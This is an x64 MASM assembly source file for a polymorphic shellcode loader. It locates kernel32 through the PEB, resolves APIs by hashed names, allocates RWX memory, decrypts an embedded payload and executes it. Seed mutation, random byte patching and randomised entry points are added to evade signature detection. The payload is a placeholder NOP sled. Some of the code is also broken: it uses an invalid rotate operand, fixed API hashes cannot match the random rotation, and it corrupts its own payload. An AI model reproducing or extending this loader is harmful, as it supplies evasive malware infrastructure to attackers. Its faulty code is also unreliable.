; polymorph_complete.asm  —  public domain 2025
; ml64 /c polymorph_complete.asm
; link /subsystem:console /entry:main polymorph_complete.obj kernel32.lib
OPTION DOTNAME
OPTION PROLOGUE:NONE
OPTION EPILOGUE:NONE

; ==================  CONFIG  ==================
; Change these two lines → new binary every build
RANDOM_SEED     EQU 0A7F9C2E5h        ; <-- mutate for polymorphism
PAYLOAD_SIZE    EQU 512               ; max bytes we decrypt/execute
; ==============================================

EXTERN  GetModuleHandleA : PROC
EXTERN  GetProcAddress   : PROC
EXTERN  ExitProcess      : PROC
EXTERN  VirtualAlloc     : PROC
EXTERN  VirtualProtect   : PROC

.data
; Dynamic runtime variables
RuntimeSeed     DD      RANDOM_SEED
RotateCount     DB      13
MutationFlag    DB      0

.code

; ----------  Random Number Generator (PRNG) ----------
Rand32  PROC
        mov     eax, [RuntimeSeed]      ; Use runtime seed instead of gs:
        mov     ecx, eax
        shl     eax, 13
        xor     eax, ecx
        mov     ecx, eax
        shr     eax, 17
        xor     eax, ecx
        mov     ecx, eax
        shl     eax, 5
        xor     eax, ecx
        mov     [RuntimeSeed], eax       ; Update runtime seed
        ret
Rand32  ENDP

; ----------  Dynamic ROR (Rotate Right) ----------
DynamicROR PROC
        ; Generate a random rotation count between 1 and 31
        call    Rand32
        and     eax, 31
        inc     eax
        mov     [RotateCount], al        ; Store for later use
        ret
DynamicROR ENDP

; ----------  Hash String with Dynamic ROR ----------
HashString PROC
        push    rbx
        xor     eax, eax
        cdq
        call    DynamicROR
        mov     bl, [RotateCount]        ; Use stored rotation count
HashLoop:
        lodsb
        test    al, al
        jz      Done
        ror     edx, bl                  ; Rotate Right by the dynamic count
        add     edx, eax
        jmp     HashLoop
Done:   
        mov     eax, edx
        pop     rbx
        ret
HashString ENDP

; ----------  Decrypt Payload (MISSING PROCEDURE ADDED) ----------
DecryptPayload PROC
        push    rsi
        push    rdi
        push    rcx
        push    rbx
        
        ; Set up for decryption
        mov     rsi, rdi                 ; Source = destination (in-place)
        mov     rcx, PAYLOAD_SIZE / 4    ; Process as dwords
        
        ; Initialize decryption with runtime seed
        mov     ebx, [RuntimeSeed]
        
DecryptLoop:
        ; Generate next key
        mov     eax, ebx
        shl     eax, 13
        xor     eax, ebx
        mov     ebx, eax
        shr     eax, 17
        xor     eax, ebx
        mov     ebx, eax
        shl     eax, 5
        xor     eax, ebx
        mov     ebx, eax
        
        ; Decrypt dword
        xor     [rsi], eax
        add     rsi, 4
        loop    DecryptLoop
        
        pop     rbx
        pop     rcx
        pop     rdi
        pop     rsi
        ret
DecryptPayload ENDP

; ----------  Resolve kernel32!API dynamically ----------
GetKernel32 PROC
        mov     rax, gs:[60h]                 ; PEB
        test    rax, rax
        jz      GetKernel32Failed
        
        mov     rax, [rax+18h]                ; PEB_LDR_DATA
        test    rax, rax
        jz      GetKernel32Failed
        
        mov     rsi, [rax+20h]                ; InMemoryOrder list
        
NextMod:
        mov     rax, [rsi]                    ; Get Flink
        test    rax, rax
        jz      GetKernel32Failed
        
        mov     rcx, [rax+50h]                ; BaseDllName.Buffer
        test    rcx, rcx
        jz      SkipModule
        
        ; Check for "kernel32.dll" more robustly
        mov     rdx, [rcx+0Ch]                ; Check for "nel3"
        mov     rbx, 00320033006Eh            ; "n\x003\x002"
        and     rdx, 00FF00FF00FFh
        cmp     rdx, rbx
        jne     SkipModule
        
        ; Found kernel32
        mov     rax, [rax+20h]                ; DllBase
        ret
        
SkipModule:
        mov     rsi, rax
        cmp     rsi, [rsi]                    ; Check if we've looped
        jne     NextMod
        
GetKernel32Failed:
        xor     rax, rax
        ret
GetKernel32 ENDP

; ----------  Resolve any API by hash (dynamic ROR) ----------
GetAPI PROC
        push    rbx
        push    rsi
        push    rdi
        
        ; rcx = module base, rdx = hash
        mov     rbx, rcx                      ; save base
        test    rbx, rbx
        jz      GetAPIFailed
        
        mov     eax, [rbx+3Ch]                ; e_lfanew
        test    eax, eax
        jz      GetAPIFailed
        
        mov     rsi, rbx
        add     rsi, rax
        mov     esi, [rsi+88h]                ; ExportDirectory RVA
        test    esi, esi
        jz      GetAPIFailed
        
        add     rsi, rbx                      ; VA
        mov     ecx, [rsi+18h]                ; NumberOfNames
        test    ecx, ecx
        jz      GetAPIFailed
        
        mov     r8d, [rsi+20h]                ; AddressOfNames RVA
        add     r8, rbx
        
NamesLoop:
        dec     ecx
        js      GetAPIFailed
        
        mov     edi, [r8+rcx*4]
        add     rdi, rbx
        
        push    rcx
        push    rdx
        push    rsi
        
        mov     rsi, rdi
        call    HashString
        
        pop     rsi
        pop     rdx
        pop     rcx
        
        cmp     eax, edx
        jne     NamesLoop
        
        ; Found it - get the function address
        mov     r8d, [rsi+24h]                ; AddressOfNameOrdinals
        add     r8, rbx
        movzx   ecx, word ptr [r8+rcx*2]      ; Ordinal
        
        mov     r8d, [rsi+1Ch]                ; AddressOfFunctions
        add     r8, rbx
        mov     eax, [r8+rcx*4]               ; Function RVA
        add     rax, rbx
        
        pop     rdi
        pop     rsi
        pop     rbx
        ret
        
GetAPIFailed:
        xor     rax, rax
        pop     rdi
        pop     rsi
        pop     rbx
        ret
GetAPI ENDP

; ==================  ENTRY  ==================
Start PROC
        sub     rsp, 28h                      ; Stack alignment
        
        ; ----  get kernel32.dll base  ----
        call    GetKernel32
        test    rax, rax
        jz      ErrorExit
        mov     r15, rax                      ; save for later

        ; ----  resolve VirtualAlloc  ----
        mov     rcx, r15
        mov     rdx, 07C0DFCAAh               ; hash("VirtualAlloc")
        call    GetAPI
        test    rax, rax
        jz      ErrorExit
        mov     r14, rax

        ; ----  allocate RWX buffer  ----
        xor     ecx, ecx
        mov     edx, PAYLOAD_SIZE
        mov     r8d, 3000h                    ; MEM_COMMIT | MEM_RESERVE
        mov     r9d, 40h                      ; PAGE_EXECUTE_READWRITE
        call    r14
        mov     rdi, rax                      ; destination
        test    rdi, rdi
        jz      ErrorExit                     ; handle allocation failure

        ; ----  copy & decrypt payload  ----
        lea     rsi, EncryptedPayload
        mov     rcx, PAYLOAD_SIZE
        rep     movsb
        
        ; Reset rdi to allocated buffer start
        sub     rdi, PAYLOAD_SIZE
        call    DecryptPayload

        ; ----  execute decrypted payload  ----
        call    rdi

        ; ----  graceful exit  ----
        mov     rcx, r15
        mov     rdx, 04FD18963h               ; hash("ExitProcess")
        call    GetAPI
        test    rax, rax
        jz      ErrorExit
        
        xor     ecx, ecx
        call    rax
        
        add     rsp, 28h
        ret

ErrorExit:
        ; Handle error gracefully
        mov     rcx, r15
        test    rcx, rcx
        jz      DirectExit
        
        mov     rdx, 04FD18963h               ; hash("ExitProcess")
        call    GetAPI
        test    rax, rax
        jz      DirectExit
        
        mov     ecx, 1                        ; exit code 1
        call    rax
        
DirectExit:
        mov     ecx, 1
        call    ExitProcess
        add     rsp, 28h
        ret
Start ENDP

; ==================  DYNAMIC ENTRY POINT  ==================
DynamicEntry PROC
        sub     rsp, 28h
        
        ; Randomly select an entry point
        call    Rand32
        and     eax, 7                        ; Select one of 8 entry points
        
        ; Jump table approach for better performance
        lea     rcx, [EntryTable]
        jmp     qword ptr [rcx + rax*8]
        
EntryTable:
        DQ      Entry0
        DQ      Entry1
        DQ      Entry2
        DQ      Entry3
        DQ      Entry4
        DQ      Entry5
        DQ      Entry6
        DQ      Entry7

Entry0:
        call    Start
        jmp     EntryExit

Entry1:
        call    HotPatcher
        call    Start
        jmp     EntryExit

Entry2:
        call    Start
        call    HotPatcher
        jmp     EntryExit

Entry3:
        call    HotPatcher
        call    HotPatcher
        call    Start
        jmp     EntryExit
        
Entry4:
        ; Mutate seed before execution
        call    Rand32
        mov     [RuntimeSeed], eax
        call    Start
        jmp     EntryExit
        
Entry5:
        ; Change rotation strategy
        mov     byte ptr [RotateCount], 7
        call    Start
        jmp     EntryExit
        
Entry6:
        ; Double mutation
        call    HotPatcher
        call    Rand32
        xor     [RuntimeSeed], eax
        call    Start
        jmp     EntryExit
        
Entry7:
        ; Full mutation cycle
        call    HotPatcher
        call    Rand32
        mov     [RuntimeSeed], eax
        call    DynamicROR
        call    Start

EntryExit:
        add     rsp, 28h
        ret
DynamicEntry ENDP

; ==================  DYNAMIC HOT PATCHER  ==================
HotPatcher PROC
        push    rcx
        push    rax
        
        ; Mutate runtime seed
        call    Rand32
        xor     [RuntimeSeed], eax
        
        ; Randomly patch payload bytes
        call    Rand32
        and     eax, 1Fh                      ; Random offset (0-31)
        lea     rcx, EncryptedPayload
        add     rcx, rax
        
        call    Rand32
        mov     byte ptr [rcx], al            ; Patch random byte
        
        ; Mutate rotation count
        call    Rand32
        and     al, 1Fh
        inc     al
        mov     [RotateCount], al
        
        ; Set mutation flag
        mov     byte ptr [MutationFlag], 1
        
        pop     rax
        pop     rcx
        ret
HotPatcher ENDP

; ==================  ADVANCED MUTATION ENGINE  ==================
MutationEngine PROC
        push    rax
        push    rcx
        push    rdx
        
        ; Check mutation flag
        cmp     byte ptr [MutationFlag], 0
        je      NoMutation
        
        ; Apply various mutations
        call    Rand32
        and     eax, 7
        
        cmp     al, 0
        je      MutateSeed
        cmp     al, 1
        je      MutatePayload
        cmp     al, 2
        je      MutateRotation
        jmp     NoMutation
        
MutateSeed:
        call    Rand32
        mov     [RuntimeSeed], eax
        jmp     MutationDone
        
MutatePayload:
        lea     rcx, EncryptedPayload
        mov     edx, 10h                      ; Mutate 16 bytes
MutateLoop:
        call    Rand32
        mov     byte ptr [rcx], al
        inc     rcx
        dec     edx
        jnz     MutateLoop
        jmp     MutationDone
        
MutateRotation:
        call    DynamicROR
        
MutationDone:
        mov     byte ptr [MutationFlag], 0
        
NoMutation:
        pop     rdx
        pop     rcx
        pop     rax
        ret
MutationEngine ENDP

; ==================  MAIN ENTRY POINT  ==================
main PROC
        sub     rsp, 28h
        
        ; Initialize runtime seed from compile-time seed
        mov     eax, RANDOM_SEED
        mov     [RuntimeSeed], eax
        
        ; Apply mutations
        call    MutationEngine
        
        ; Apply hot patches
        call    HotPatcher
        
        ; Start the main routine through dynamic entry
        call    DynamicEntry
        
        ; Exit
        xor     ecx, ecx
        call    ExitProcess
        
        add     rsp, 28h
        ret
main ENDP

; ==================  DATA SECTION  ==================
.data
EncryptedPayload LABEL BYTE
        ; Expanded payload (512 bytes as specified)
        ; This is encrypted with RANDOM_SEED
        ; First 32 bytes
        DB  09Eh,05Ch,0A6h,0CCh,0B9h,0E0h,07Bh,02Dh
        DB  066h,0F9h,03Ch,0A4h,0D1h,07Ch,0E8h,0C5h
        DB  012h,034h,056h,078h,09Ah,0BCh,0DEh,0F0h
        DB  011h,033h,055h,077h,099h,0BBh,0DDh,0FFh
        
        ; Additional 480 bytes (simplified for space)
        DB  480 DUP(090h)  ; NOP sled for demonstration

END main